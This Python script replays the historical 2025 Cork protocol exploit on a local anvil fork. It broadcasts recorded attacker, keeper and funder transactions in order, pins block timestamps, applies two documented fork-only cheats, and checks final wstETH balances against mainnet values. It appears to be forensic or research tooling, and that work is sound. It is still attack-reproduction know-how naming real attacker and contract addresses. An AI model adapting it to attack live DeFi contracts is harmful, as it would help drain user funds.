#!/usr/bin/env python3
"""Replay the Cork 2025 attack on a local anvil fork (36-tx combined sequence).

Usage: replay.py [anvil_url] [--no-pin]

Broadcasts the ordered raw txs (attacker + Cork keeper + funder, interleaved
in historical block order) from manifest.json. With pinning (default) each
block's timestamp is set to its historical value via anvil_setNextBlockTimestamp —
the attack straddles a market expiry, so wall-clock timestamps break both the
skew (hardcoded 19-minutes-to-expiry parameters) and the rollover's expiry gate.

Documented cheats (all local-fork only, all required):
  1. anvil_setBalance(keeper, 1 ETH) — the keeper's fork-block balance
     (0.00126 ETH) cannot pay for ~25M gas of keeper operations (its mainnet
     balance was funded in-window).
  2. anvil_setNonce(funder, N) before the two keeper-funding transfers — the
     funder made 11 unrelated txs in the fork window that the replay excludes.

Keeper rebalances for OTHER Cork markets revert against stale fork state;
that is expected and harmless (reverted txs still consume nonces, write no
state). Critical txs (rebalance/skew/rollover/exploit) must succeed.
"""
import json
import os
import sys
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
ANVIL = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("--") else "http://127.0.0.1:8547"
PIN = "--no-pin" not in sys.argv

WSTETH = "0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0"
MODULECORE = "0xccd90f6435dd78c4ecced1fa4db0d7242548a2a9"
POOLMANAGER = "0x000000000004444c5dc75cb358380d2e3de08a90"
EOA = "0xea6f30e360192bae715599e15e2f765b49e4da98"
C1 = "0x6e54115de254805365c2d9c8a2eeb9b52e54668f"
C2 = "0x9af3dce0813fd7428c47f57a39da2f6dd7c9bb09"
KEEPER = "0x777777727073e72fbb3c81f9a8b88cc49feae2f5"
FUNDER = "0x028b671994abce5529722d1b18c404112289d17d"

# Exact mainnet values (verified against archive state) for the gates.
GATES = {
    "c2_wsteth_after": 3761877955369549831945,
    "modulecore_wsteth_after": 34474759349606697572,
}
MAINNET_GAS = {
    "0x3a3a0fc5e046fb122aca956f7730310f73452e65b2769c51475eceb9633e69c6": 477912,   # LV rebalance
    "0x14cdf1a643fc94a03140b7581239d1b7603122fbb74a80dd4704dfb336c1dec0": 2225451,  # skew
    "0xcdd80e59a089cf3e622dc392c622eba9b1ba9780773cc562190191ecb56bf8eb": 4858959,  # rollover
    "0xfd89cdd0be468a564dd525b222b728386d7c6780cf7b2f90d2b54493be09f64d": 7946138,  # exploit
}
CRITICAL = set(MAINNET_GAS)
FUNDER_NONCE = {
    "0xe78e524bd7c908d3b137f91d4b6f74b678bdb617407d94d491c336d6d2aaf3e8": 99,
    "0x8cbc5bd5ba25f5121c4faa4e6526e4c1c90e621bf66dee1cbdc47db5968018ee": 107,
}

def rpc(method, params):
    body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": method, "params": params}).encode()
    req = urllib.request.Request(ANVIL, data=body, headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=600) as r:
        d = json.loads(r.read())
    if "error" in d:
        raise RuntimeError(f"{method}: {d['error']}")
    return d["result"]

def wsteth_bal(addr):
    return int(rpc("eth_call", [{"to": WSTETH, "data": "0x70a08231" + "0" * 24 + addr[2:]}, "latest"]), 16)

def main():
    manifest = json.load(open(os.path.join(HERE, "manifest.json")))
    print(f"=== Cork 2025 replay start (pin={PIN}) anvil={ANVIL} ===")
    print("fork block:", int(rpc("eth_blockNumber", []), 16))
    pre = {k: wsteth_bal(a) for k, a in
           [("EOA", EOA), ("C1", C1), ("C2", C2), ("ModuleCore", MODULECORE), ("PoolManager", POOLMANAGER)]}
    print("PRE (wstETH):", {k: f"{v / 1e18:.6f}" for k, v in pre.items()})

    rpc("anvil_setBalance", [KEEPER, "0xde0b6b3a7640000"])  # 1 ETH
    print("[cheat] keeper balance -> 1 ETH")

    failures = 0
    for m in manifest:
        raw = open(os.path.join(HERE, m["raw_file"])).read().strip()
        if m["hash"] in FUNDER_NONCE:
            rpc("anvil_setNonce", [FUNDER, hex(FUNDER_NONCE[m["hash"]])])
            print(f"  [cheat] funder nonce -> {FUNDER_NONCE[m['hash']]}")
        if PIN:
            rpc("anvil_setNextBlockTimestamp", [m["ts"]])
        try:
            txh = rpc("eth_sendRawTransaction", [raw])
        except RuntimeError as e:
            print(f"  [{m['order']:02d}] SEND FAILED: {e} :: {m['role'][:70]}")
            failures += 1
            break
        rcpt = None
        for _ in range(600):
            rcpt = rpc("eth_getTransactionReceipt", [txh])
            if rcpt:
                break
            time.sleep(1)
        if rcpt is None:
            print(f"  [{m['order']:02d}] NO RECEIPT :: {m['role'][:70]}")
            failures += 1
            break
        gas = int(rcpt["gasUsed"], 16)
        mg = MAINNET_GAS.get(m["hash"])
        match = f" (mainnet {mg} {'MATCH' if mg == gas else 'DIFF!'})" if mg else ""
        print(f"  [{m['order']:02d}] status={rcpt['status']} gas={gas}{match} :: {m['role'][:70]}")
        if rcpt["status"] != "0x1":
            if m["hash"] in CRITICAL or m["who"] == "attacker":
                print("  ^^ CRITICAL REVERT — stopping")
                failures += 1
                break
            print("  ^^ reverted (non-critical, other-market keeper op; nonce consumed) — continuing")

    post = {k: wsteth_bal(a) for k, a in
            [("EOA", EOA), ("C1", C1), ("C2", C2), ("ModuleCore", MODULECORE), ("PoolManager", POOLMANAGER)]}
    print("POST (wstETH):", {k: f"{v / 1e18:.6f}" for k, v in post.items()})

    ok = failures == 0
    print("=== gates ===")
    for name, want, got in [
        ("C2 wstETH after exploit", GATES["c2_wsteth_after"], post["C2"]),
        ("ModuleCore wstETH after exploit", GATES["modulecore_wsteth_after"], post["ModuleCore"]),
    ]:
        good = got == want
        ok = ok and good
        print(f"  {'OK  ' if good else 'FAIL'} {name}: {got} (want {want}, delta {got - want})")
    sys.exit(0 if ok else 1)

if __name__ == "__main__":
    main()
